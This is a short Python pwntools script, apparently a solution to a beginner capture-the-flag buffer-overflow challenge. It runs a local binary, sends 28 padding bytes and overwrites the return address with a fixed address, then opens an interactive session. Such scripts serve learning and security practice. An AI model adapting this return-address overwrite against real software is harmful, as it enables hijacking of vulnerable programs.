from pwn import *

r = process('./bofe4sy')

payload = b'B'*28

r.sendline(payload + p64(0x00400646))

r.interactive()
